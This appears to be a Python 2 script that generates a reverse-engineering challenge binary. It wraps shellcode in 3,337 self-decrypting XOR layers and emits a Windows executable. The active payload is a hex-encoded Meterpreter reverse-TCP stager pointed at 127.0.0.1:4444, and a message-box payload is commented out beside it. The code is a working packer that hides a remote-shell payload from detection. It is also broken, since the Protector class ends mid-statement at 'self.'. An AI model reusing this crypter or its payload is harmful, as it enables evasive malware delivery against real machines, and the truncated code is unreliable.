import sys
from time import time
from binascii import unhexlify
from struct import pack as p
from random import randint
from goasm import *

class XorLayer(object):
    def __init__(self, code_to_protect):
        # CPU Disasm
        # Address   Hex dump          Command                                  Comments
        # <ModuleEn  .  E8 00000000   CALL decrypt_stub.00401005
        # 00401005   $  58            POP EAX
        # 00401006   .  05 1A000000   ADD EAX,1A
        # 0040100B   >  8B18          MOV EBX,DWORD PTR [EAX]
        # 0040100D   .  81FB 12A196B1 CMP EBX,B196A112
        # 00401013   .  0F84 06000000 JE decrypt_stub.0040101F
        # 00401019   .  8030 F1       XOR BYTE PTR [EAX],F1
        # 0040101C   .  40            INC EAX
        # 0040101D   .^ EB EC         JMP SHORT decrypt_stub.0040100B
        self.decrypt_stub_original = '\xE8\x00\x00\x00\x00' '\x58' '\x05\x1A\x00\x00\x00' '\x8B\x18' '\x81\xFB\x12\xA1\x96\xB1' '\x0F\x84\x06\x00\x00\x00' '\x80\x30\xF1' '\x40' '\xEB\xEC'

        # find where the xor key is set
        self.idx_xor_key = self.decrypt_stub_original.find('\xf1')
        # find where the magic dword is compared
        self.idx_magic_dword = self.decrypt_stub_original.find('\x12\xA1\x96\xB1')

        # generate a 1byte xor key
        self.key = randint(0, 0xff)
        # generate a 4bytes magic dword
        self.magic_dword = p('<I', randint(0, 0xffffffff))
        
        # protecting the code with a simple xor
        self.code_to_protect_xored = ''.join([chr(ord(b) ^ self.key) for b in code_to_protect]) + self.magic_dword

        # modify the decrypt stub
        self.decrypt_stub = bytearray(self.decrypt_stub_original)
        self.decrypt_stub[self.idx_xor_key] = self.key
        self.decrypt_stub[self.idx_magic_dword : self.idx_magic_dword + 4] = self.magic_dword
        self.decrypt_stub = str(self.decrypt_stub)

    def __str__(self):
        return '%s%s%s' % (self.decrypt_stub, self.code_to_protect_xored, self.magic_dword)

class Protector(object):
    def __init__(self, code_to_protect):
        self.code_to_protect = code_to_protect
        self.

def main(argc, argv):
    t1 = time()

    # msfpayload windows/messagebox TITLE='yeah' TEXT='You have passed all the layers!' R
    # code_to_protect = unhexlify('d9 eb 9b d9 74 24 f4 31 d2 b2 77 31 c9 64 8b 71 30 8b 76 0c 8b 76 1c 8b 46 08 8b 7e 20 8b 36 38 4f 18 75 f3 59 01 d1 ff e1 60 8b 6c 24 24 8b 45 3c 8b 54 28 78 01 ea 8b 4a 18 8b 5a 20 01 eb e3 34 49 8b 34 8b 01 ee 31 ff 31 c0 fc ac 84 c0 74 07 c1 cf 0d 01 c7 eb f4 3b 7c 24 28 75 e1 8b 5a 24 01 eb 66 8b 0c 4b 8b 5a 1c 01 eb 8b 04 8b 01 e8 89 44 24 1c 61 c3 b2 08 29 d4 89 e5 89 c2 68 8e 4e 0e ec 52 e8 9f ff ff ff 89 45 04 bb 7e d8 e2 73 87 1c 24 52 e8 8e ff ff ff 89 45 08 68 6c 6c 20 41 68 33 32 2e 64 68 75 73 65 72 88 5c 24 0a 89 e6 56 ff 55 04 89 c2 50 bb a8 a2 4d bc 87 1c 24 52 e8 61 ff ff ff 68 58 20 20 20 68 79 65 61 68 31 db 88 5c 24 04 89 e3 68 72 73 21 58 68 6c 61 79 65 68 74 68 65 20 68 61 6c 6c 20 68 73 65 64 20 68 20 70 61 73 68 68 61 76 65 68 59 6f 75 20 31 c9 88 4c 24 1f 89 e1 31 d2 52 53 51 52 ff d0 31 c0 50 ff 55 08'.replace(' ', ''))
    # meterpreter
    code_to_protect = unhexlify('fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f0 52 57 8b 52 10 8b 42 3c 01 d0 8b 40 78 85 c0 74 4a 01 d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b 01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e2 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 eb 86 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 ff d5 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 05 68 7f 00 00 01 68 02 00 11 5c 89 e6 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0c ff 4e 08 75 ec 68 f0 b5 a2 56 ff d5 6a 00 6a 04 56 57 68 02 d9 c8 5f ff d5 8b 36 6a 40 68 00 10 00 00 56 6a 00 68 58 a4 53 e5 ff d5 93 53 6a 00 56 53 57 68 02 d9 c8 5f ff d5 01 c3 29 c6 85 f6 75 ec c3'.replace(' ', ''))


    code_protected = code_to_protect

    layers_number = 3337
    for i in range(layers_number):
        code_protected = str(XorLayer(code_protected))

    t2 = time()

    raw_code = RawContent(code_protected)
    c = CodeSection('.text')
    c.add(raw_code)

    e = Executable('layerz')
    e.add(c)
    e.generate()

    t3 = time()
    print 'Done in %f s (%f to generate the code)' % ((t3 - t1), (t2 - t1))
    return 1

if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))